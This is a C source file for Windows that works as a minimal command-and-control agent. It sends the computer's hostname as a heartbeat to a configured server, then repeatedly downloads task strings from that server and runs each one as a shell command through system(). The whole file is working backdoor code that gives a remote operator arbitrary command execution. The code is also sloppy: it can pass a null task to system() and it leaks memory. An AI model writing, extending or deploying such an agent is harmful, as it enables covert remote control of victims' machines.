#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

const char IP_ADDRESS[] = "127.0.0.1";
const char PORT[] = "8000";

char *get_task(const char *hostname);

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t realsize = size * nmemb;
    char **buf = (char **)userdata;
    size_t cur_len = *buf ? strlen(*buf) : 0;
    char *newbuf = realloc(*buf, cur_len + realsize + 1);
    if(!newbuf) return 0;
    memcpy(newbuf + cur_len, ptr, realsize);
    newbuf[cur_len + realsize] = '\0';
    *buf = newbuf;
    return realsize;
}

int heartbeat(char *hostname);
/* char get_task(char *hostname, char *IP_ADDRESS, char *PORT); */
int main(void) {

    char hostname[1024];
    DWORD size = sizeof(hostname); /* size in characters */
    if (!GetComputerNameA(hostname, &size)) {
        fprintf(stderr, "GetComputerNameA failed: %lu\n", GetLastError());
        strcpy(hostname, "unknown");
    }

    printf("Hostname: %s\n", hostname);
    while (heartbeat(hostname))
    {
        Sleep(2000); /* wait for 5 seconds before retrying */
        printf("Retrying heartbeat...\n");
    }
    
    while(1){
        system(get_task(hostname));
        Sleep(3000);
    }

    return 0;
}



char *get_task(const char *hostname)
{
    CURL *curl;
    CURLcode res;
    char url[1024];
    snprintf(url, sizeof(url), "http://%s:%s/getTask?path=host/%s/task.txt", IP_ADDRESS, PORT, hostname);

    curl = curl_easy_init();
    if(!curl) return NULL;

    char *response = NULL; // will be realloc'd in callback

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

    res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        fprintf(stderr, "GET failed: %s\n", curl_easy_strerror(res));
        free(response);
        response = NULL;
    }

    curl_easy_cleanup(curl);
    return response; // NULL on error, otherwise caller must free()
}


int heartbeat(char *hostname){

    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;

    /*Inits the winsock*/
    res=curl_global_init(CURL_GLOBAL_DEFAULT);
    
    if(res!=CURLE_OK){
        fprintf(stderr,"curl_global_init() failed: %s\n",curl_easy_strerror(res));
        exit(EXIT_FAILURE);
    }

    /*Build json hostname for POST*/
    char json_payload[1024];
    char url[1024];
    snprintf(url, sizeof(url), "http://%s:%s/heartbeat", IP_ADDRESS, PORT);
    printf("%s\n", url);
    snprintf(json_payload, sizeof(json_payload), "{\"hostname\":\"%s\"}", hostname);

    /*Inits a curl session*/
    curl=curl_easy_init();
    if(curl){
        /*Set the URL for the operation*/
        curl_easy_setopt(curl,CURLOPT_URL, url);
        /*Enable POST*/
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_payload));

        /*Set the hostname in the post field*/
        
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
         curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);  //added to see server response

        /*Perform the request, res will get the return code*/
        res=curl_easy_perform(curl);



        printf("Heartbeat sent\n");

        /*Check for errors*/
        if(res!=CURLE_OK){
            fprintf(stderr,"curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
            return -1;
        }

        /*Cleanup*/
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 0;
    }


    
}

